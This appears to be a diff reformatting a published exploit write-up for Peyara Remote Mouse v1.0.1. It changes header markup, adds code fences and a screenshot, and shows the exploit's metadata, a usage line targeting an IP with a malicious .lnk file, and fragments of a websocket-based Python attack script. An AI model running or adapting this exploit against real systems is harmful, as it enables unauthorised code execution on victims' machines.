@@ -1,13 +1,13 @@
-# Exploit Title: Peyara Remote Mouse v1.0.1 FILE UPLOAD
-# Date: 2025-01-06
-# Exploit Author: tmrswrr
-# Software Link: https://peyara-remote-mouse.vercel.app/
-# Platform: Windows
-# Version: v1.0.1
-# Tested on: Windows 10
+### Exploit Title: Peyara Remote Mouse v1.0.1 FILE UPLOAD
+### Date: 2025-01-06
+### Exploit Author: tmrswrr
+### Software Link: https://peyara-remote-mouse.vercel.app/
+### Platform: Windows
+### Version: v1.0.1
+### Tested on: Windows 10
 
 
-#USAGE : python3 combined_script.py <target_ip> <path_to_lnk_file>
+### USAGE : python3 combined_script.py <target_ip> <path_to_lnk_file>
 """
 Create evil.lnk file: 
 
@@ -24,7 +24,8 @@ You will be see opening calc.exe
 
 
 """
-#EXPLOIT
+### EXPLOIT
+```
 #!/usr/bin/env python3
 import asyncio
 import websockets
@@ -147,3 +148,7 @@ if __name__ == "__main__":
     
 
     asyncio.get_event_loop().run_until_complete(execute_exploit(args.target))
+```
+
+ <img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara1.png" width="100%"></img>
+
